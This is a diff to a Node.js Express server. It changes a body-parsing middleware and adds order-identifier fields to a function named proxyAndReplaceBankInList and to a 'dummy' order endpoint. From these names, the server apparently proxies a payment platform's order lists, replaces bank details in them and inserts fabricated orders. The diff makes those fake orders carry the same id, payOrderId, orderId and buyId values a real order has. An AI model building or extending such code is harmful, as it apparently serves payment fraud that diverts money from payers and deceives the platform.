@@ -867,23 +867,19 @@ function bankListText(d) {
   }).join('\n');
 }
 
-app.use(async (req, res, next) => {
-  if (req.body && typeof req.body === 'object') {
+app.use((req, res, next) => {
+  if (req.body && typeof req.body === 'object' && Object.keys(req.body).length > 0) {
     req.parsedBody = req.body;
+    ensureWebhook().catch(() => { });
+    return next();
   }
 
-  let calledNext = false;
-  const safeNext = () => {
-    if (!calledNext) {
-      calledNext = true;
-      ensureWebhook().catch(() => { });
-      next();
-    }
-  };
-
   const chunks = [];
-  req.on('data', c => chunks.push(c));
-  req.on('end', () => {
+  let done = false;
+
+  const finish = () => {
+    if (done) return;
+    done = true;
     if (chunks.length > 0) {
       req.rawBody = Buffer.concat(chunks);
       try {
@@ -897,12 +893,17 @@ app.use(async (req, res, next) => {
       } catch (e) { }
     }
     if (!req.parsedBody && req.body) req.parsedBody = req.body;
-    safeNext();
-  });
+    if (!req.parsedBody) req.parsedBody = {};
+    ensureWebhook().catch(() => { });
+    next();
+  };
 
-  if (req.complete || req.readableEnded || req.body) {
-    if (!req.parsedBody && req.body) req.parsedBody = req.body;
-    setImmediate(() => safeNext());
+  req.on('data', c => chunks.push(c));
+  req.on('end', finish);
+  req.on('error', finish);
+
+  if (req.readableEnded || req.method === 'GET' || req.method === 'HEAD') {
+    finish();
   }
 });
 
@@ -1948,6 +1949,10 @@ async function proxyAndReplaceBankInList(req, res) {
             const amt = parseFloat(d.amount || d.orderAmount || 0);
             const inc = parseFloat((amt * (p / 100)).toFixed(2));
 
+            d.id = cd;
+            d.payOrderId = cd;
+            d.orderId = cd;
+            d.buyId = cd;
             d.code = cd;
             d.orderCode = cd;
             d.buyCode = cd;
@@ -4432,13 +4437,18 @@ app.post('/yougogirl/api/dummy/add', async (req, res) => {
     const p = parseFloat(percent) || data.defaultIncomePercent || 3;
     const incVal = parseFloat((amtNum * (p / 100)).toFixed(2));
     const cd = generateDummyCode();
+    const numId = generateDummyId();
     const dummy = {
-      id: generateDummyId(),
+      id: cd,
+      payOrderId: cd,
+      orderId: cd,
+      buyId: cd,
       code: cd,
       orderCode: cd,
       buyCode: cd,
       remark: cd,
       sn: cd,
+      numericId: numId,
       amount: amtNum,
       orderAmount: amtNum,
       percent: p,
